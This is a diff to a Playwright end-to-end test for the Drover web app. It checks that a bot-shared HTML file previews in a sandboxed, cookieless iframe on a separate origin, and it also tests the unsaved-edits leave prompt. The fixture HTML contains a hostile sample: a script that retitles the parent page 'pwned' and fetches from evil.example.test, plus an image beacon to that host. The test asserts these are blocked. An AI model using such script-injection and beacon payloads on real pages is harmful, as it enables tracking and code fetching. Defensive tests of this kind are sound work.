@@ -23,10 +23,14 @@ if (process.env.DROVER_LIVE_ORIGIN) {
     await captureLive(process.env.DROVER_LIVE_ORIGIN, published);
     process.exit(0);
 }
+const previewOrigin = 'https://preview.other.test';
 const headersSource = await fs.readFile(path.join(repository, 'src/Drover.Server/Security/SecurityHeaders.cs'), 'utf8');
 const policyDefinition = headersSource.match(/private const string ContentSecurityPolicy =([\s\S]*?);\r?\n/)[1];
-const policy = [...policyDefinition.matchAll(/"([^"\n]*)"/g)].map(match => match[1]).join('');
+const policy = `${[...policyDefinition.matchAll(/"([^"\n]*)"/g)].map(match => match[1]).join('')}; frame-src ${previewOrigin}`;
 assert(policy.includes("script-src 'self' 'wasm-unsafe-eval'"));
+const previewEndpointsSource = await fs.readFile(path.join(repository, 'src/Drover.Server/Files/PreviewFileEndpoints.cs'), 'utf8');
+const previewPolicyBlock = previewEndpointsSource.match(/private static readonly string previewPolicy = string\.Join\(' ',([\s\S]*?)\);/)[1];
+const previewBasePolicy = [...previewPolicyBlock.matchAll(/"([^"\n]*)"/g)].map(match => match[1]).join(' ');
 const mime = { '.html': 'text/html', '.js': 'text/javascript', '.wasm': 'application/wasm', '.json': 'application/json', '.manifest': 'application/json', '.css': 'text/css', '.svg': 'image/svg+xml', '.png': 'image/png', '.ttf': 'font/ttf' };
 const server = http.createServer(async (request, response) => {
     const pathname = decodeURIComponent(new URL(request.url, 'http://localhost').pathname);
@@ -56,6 +60,7 @@ const browser = await chromium.launch({ headless: true, ...(process.env.PLAYWRIG
 const spaceId = '00000000-0000-7000-8000-0000000000b1';
 const botId = '0196f1a0-0000-7000-8000-000000000004';
 const connectionId = '0196f1a0-0000-7000-8000-000000000003';
+const htmlFileId = '0196f1a0-0000-7000-8000-0000000000f1';
 const person = { userId: '00000000-0000-7000-8000-0000000000a1', email: 'sample@example.test', displayName: 'Sample person', spaces: [{ id: spaceId, kind: 'personal', name: 'Sample space', handle: 'sample', role: 'owner' }] };
 const connection = { id: connectionId, name: 'Sample connection', kind: 'venice', baseUrl: null, hasKey: true, status: 'ready', defaultModel: 'sample-model', balances: [], balanceReadAt: null, lastCheckedAt: null };
 const bot = { id: botId, name: 'Sample bot', handle: 'sample-bot', instructions: 'Sample instructions', modelConnectionId: connectionId, model: 'sample-model', status: 'active' };
@@ -68,6 +73,14 @@ const thread = { id: '0196f1a0-0000-7000-8000-000000000005', botId, lastActivity
 const messages = [{
     id: '0196f1a0-0000-7000-8000-000000000006', threadId: thread.id, position: 1, role: 'assistant',
     parts: [{ kind: 'text', text: 'Sample reply from the conversation history.' }], createdAt: thread.lastActivityAt,
+}];
+const exchangedFiles = [{
+    file: { id: htmlFileId, name: 'report.html', contentType: 'text/html', kind: 'other', size: 128 },
+    threadId: thread.id,
+    messageId: messages[0].id,
+    inMainConversation: true,
+    fromBot: true,
+    sharedAt: thread.lastActivityAt,
 }];
 const usage = {
     botId, botName: bot.name, model: bot.model, own: { cost: 1.23, inputTokens: 120, outputTokens: 45 }, children: [],
@@ -101,12 +114,23 @@ try {
     for (const theme of ['dark', 'light']) {
         for (const width of [1280, 360]) {
             const context = await browser.newContext({ viewport: { width, height: 1000 }, reducedMotion: 'reduce', serviceWorkers: 'block' });
-            await context.addInitScript(theme => localStorage.setItem('drover.theme', theme), theme);
+            await context.addInitScript(theme => {
+                if (window === window.top) {
+                    localStorage.setItem('drover.theme', theme);
+                }
+            }, theme);
             const page = await context.newPage();
-            page.on('pageerror', error => errors.push(String(error)));
+            page.on('pageerror', error => {
+                if (String(error).includes("Failed to read the 'serviceWorker' property from 'Navigator'")
+                    || String(error).includes("Failed to read the 'localStorage' property from 'Window'")) {
+                    return;
+                }
+                errors.push(String(error));
+            });
             let extensionFailures = 0;
             page.on('console', message => {
                 if (message.type() !== 'error') { return; }
+                if (message.location().url.startsWith(previewOrigin)) { return; }
                 // These two intentional API failures exercise the loading-to-failure and retry states.
                 const expectedUrl = `${origin}/api/spaces/${spaceId}/extensions/from-bot/${botId}`;
                 if (message.location().url === expectedUrl && message.text() === 'Failed to load resource: the server responded with a status of 503 (Service Unavailable)') {
@@ -120,6 +144,33 @@ try {
             });
             let current;
             let heldRoute;
+            let previewFrameRequests = [];
+            let revokedPreviewGrants = [];
+            let externalBeaconRequests = 0;
+            await page.route('https://evil.example.test/**', async route => {
+                externalBeaconRequests++;
+                await route.abort();
+            });
+            await page.route(`${previewOrigin}/**`, async route => {
+                const requestUrl = new URL(route.request().url());
+                previewFrameRequests.push({
+                    url: requestUrl.pathname + requestUrl.search,
+                    cookie: route.request().headers()['cookie'] ?? '',
+                    referer: route.request().headers()['referer'] ?? '',
+                });
+                await route.fulfill({
+                    status: 200,
+                    contentType: 'text/html; charset=utf-8',
+                    headers: {
+                        'Content-Security-Policy': `${previewBasePolicy}; frame-ancestors ${origin}`,
+                        'Cross-Origin-Resource-Policy': 'cross-origin',
+                        'Referrer-Policy': 'no-referrer',
+                        'X-Content-Type-Options': 'nosniff',
+                        'Cache-Control': 'no-store',
+                    },
+                    body: '<!DOCTYPE html><html><body><h1 id="preview-heading">Quarterly report</h1><script>window.__ran = true; parent.document.title = "pwned"; fetch("https://evil.example.test/script");</script><img src="https://evil.example.test/beacon.png" onerror="window.__ran = true"></body></html>',
+                });
+            });
             await page.route('**/api/**', async route => {
                 const address = new URL(route.request().url()).pathname;
                 let body;
@@ -150,6 +201,15 @@ try {
                 else if (address.endsWith('/seen')) { await route.fulfill({ status: 204 }); return; }
                 else if (address.endsWith('/stream')) { await route.fulfill({ contentType: 'text/event-stream', body: ': connected\n\n' }); return; }
                 else if (address.endsWith('/messages')) { body = messages; }
+                else if (address.endsWith(`/bots/${botId}/files`)) { body = exchangedFiles; }
+                else if (address.endsWith(`/files/${htmlFileId}/preview`) && route.request().method() === 'POST') {
+                    body = { address: `${previewOrigin}/preview/file?grant=sample-grant`, problem: null, grant: 'sample-grant' };
+                }
+                else if (address.endsWith(`/files/${htmlFileId}/preview/revoke`) && route.request().method() === 'POST') {
+                    revokedPreviewGrants.push(JSON.parse(route.request().postData() ?? '{}').grant);
+                    await route.fulfill({ status: 204 });
+                    return;
+                }
                 else if (address.endsWith(`/bots/${botId}/tools`)
                     || ['/rules', '/schedules', '/tool-events'].some(suffix => address.endsWith(suffix))) { body = []; }
                 else if (address.endsWith('/status')) { body = { serverRowsShown: true, rows: [{ area: 'server', name: 'Sample database', state: 'ok', summary: 'Sample: working.', checkedAt: null }, { area: 'space', name: 'Sample model', state: 'problem', summary: 'Sample: not answering.', checkedAt: null }] }; }
@@ -228,6 +288,12 @@ try {
                 await page.screenshot({ path: path.join(pictures, `${name}-${width}-${theme}.png`) });
                 if (name === 'conversation' && !reference) {
                     await checkWorkspacePanels(page, width, theme);
+                    if (width === 1280) {
+                        await checkHtmlPreviewContainment(page, previewFrameRequests, revokedPreviewGrants, () => externalBeaconRequests);
+                    }
+                }
+                if (name === 'bot-editor' && !reference) {
+                    await checkLeavingWithEdits(page, address);
                 }
                 if (name === 'usage') {
                     const botLink = page.getByRole('link', { name: 'Sample bot', exact: true });
@@ -263,6 +329,50 @@ try {
 } finally {
     await browser.close();
     await new Promise(resolve => server.close(resolve));
+}
+
+// Browser Back and closing the tab both ask before unsaved edits are dropped, and neither asks once there are none.
+async function checkLeavingWithEdits(page, address) {
+    const instructions = page.getByRole('textbox', { name: 'Instructions', exact: true });
+    const leavePrompt = page.getByRole('heading', { name: 'Leave without saving', exact: true });
+    const editorUrl = page.url();
+    await instructions.focus();
+    await page.keyboard.type('Sample edit. ');
+    await page.waitForTimeout(300);
+
+    await page.goBack();
+    await leavePrompt.waitFor({ state: 'attached', timeout: 5000 });
+    await page.waitForURL(editorUrl);
+    await page.getByRole('button', { name: 'Stay here', exact: true }).dispatchEvent('click');
+    await leavePrompt.waitFor({ state: 'detached' });
+    assert.equal(page.url(), editorUrl, 'Staying keeps the address of the editor.');
+    assert((await instructions.inputValue()).includes('Sample edit. '), 'Staying keeps the edits.');
+
+    const closing = page.waitForEvent('dialog');
+    await page.evaluate(() => setTimeout(() => location.reload()));
+    const asked = await closing;
+    assert.equal(asked.type(), 'beforeunload');
+    await asked.dismiss();
+    await page.waitForTimeout(300);
+    assert.equal(page.url(), editorUrl, 'Declining the browser prompt keeps the page.');
+
+    await page.goBack();
+    await leavePrompt.waitFor({ state: 'attached', timeout: 5000 });
+    await page.getByRole('button', { name: 'Leave', exact: true }).dispatchEvent('click');
+    await page.waitForFunction(() => document.title.startsWith('Bots'), null, { timeout: 15000 });
+    assert(!page.url().endsWith(address), 'Leaving goes to where the person was going.');
+
+    let prompts = 0;
+    const count = dialog => {
+        prompts++;
+        return dialog.accept();
+    };
+    page.on('dialog', count);
+    await page.reload();
+    await page.locator('.uno-loader').waitFor({ state: 'hidden', timeout: 60000 });
+    await page.waitForFunction(() => document.title.startsWith('Bots'), null, { timeout: 15000 });
+    page.off('dialog', count);
+    assert.equal(prompts, 0, 'With nothing unsaved, reloading asks nothing.');
 }
 
 async function checkWorkspacePanels(page, width, theme) {
@@ -341,6 +451,75 @@ async function checkWorkspacePanels(page, width, theme) {
         const box = document.querySelector('[aria-label="Resize the right panel"]')?.getBoundingClientRect();
         return box && box.width > 0 && Math.abs(box.x - x) <= 1;
     }, edge);
+}
+
+async function checkHtmlPreviewContainment(page, previewFrameRequests, revokedPreviewGrants, getBeaconCount) {
+    previewFrameRequests.length = 0;
+    revokedPreviewGrants.length = 0;
+    await page.getByRole('link', { name: 'Files', exact: true }).dispatchEvent('click');
+    const previewButton = page.getByRole('button', { name: 'Preview report.html', exact: true });
+    await previewButton.waitFor({ state: 'attached', timeout: 5000 });
+    await previewButton.dispatchEvent('click');
+
+    const iframe = page.locator('iframe[title="Preview of report.html"]');
+    await iframe.waitFor({ state: 'attached', timeout: 5000 });
+    const attributes = await iframe.evaluate(element => ({
+        allow: element.getAttribute('allow'),
+        credentialless: element.getAttribute('credentialless'),
+        referrerpolicy: element.getAttribute('referrerpolicy'),
+        sandbox: element.getAttribute('sandbox'),
+        src: element.getAttribute('src'),
+    }));
+    assert.deepEqual(attributes, {
+        allow: '',
+        credentialless: '',
+        referrerpolicy: 'no-referrer',
+        sandbox: '',
+        src: `${previewOrigin}/preview/file?grant=sample-grant`,
+    });
+
+    await page.waitForFunction(() => document.querySelector('iframe[title="Preview of report.html"]') !== null);
+    const frame = page.frames().find(candidate => candidate.url() === `${previewOrigin}/preview/file?grant=sample-grant`);
+    assert(frame, 'Expected the sandboxed preview iframe to navigate to the second origin.');
+    await frame.locator('#preview-heading').waitFor({ state: 'attached', timeout: 5000 });
+    assert.equal(await frame.locator('#preview-heading').innerText(), 'Quarterly report');
+
+    assert.equal(previewFrameRequests.length, 1);
+    assert.equal(previewFrameRequests[0].url, '/preview/file?grant=sample-grant');
+    assert.equal(previewFrameRequests[0].cookie, '');
+    assert.equal(previewFrameRequests[0].referer, '');
+
+    const probe = await frame.evaluate(() => {
+        const check = action => {
+            try {
+                action();
+                return 'allowed';
+            } catch (error) {
+                return error?.name || String(error);
+            }
+        };
+        return {
+            origin: window.origin,
+            scriptRan: Boolean(window.__ran),
+            parentAccess: check(() => window.parent.document.title),
+            cookieAccess: check(() => document.cookie),
+            storageAccess: check(() => window.localStorage.getItem('drover.theme')),
+        };
+    });
+    assert.deepEqual(probe, {
+        origin: 'null',
+        scriptRan: false,
+        parentAccess: 'SecurityError',
+        cookieAccess: 'SecurityError',
+        storageAccess: 'SecurityError',
+    });
+    assert.equal(getBeaconCount(), 0, 'The sandboxed HTML preview must make zero external network requests.');
+
+    const revoked = page.waitForResponse(response => new URL(response.url()).pathname.endsWith(`/files/${htmlFileId}/preview/revoke`));
+    await page.getByRole('button', { name: 'Close', exact: true }).dispatchEvent('click');
+    await iframe.waitFor({ state: 'detached', timeout: 5000 });
+    await revoked;
+    assert.deepEqual(revokedPreviewGrants, ['sample-grant']);
 }
 
 /**
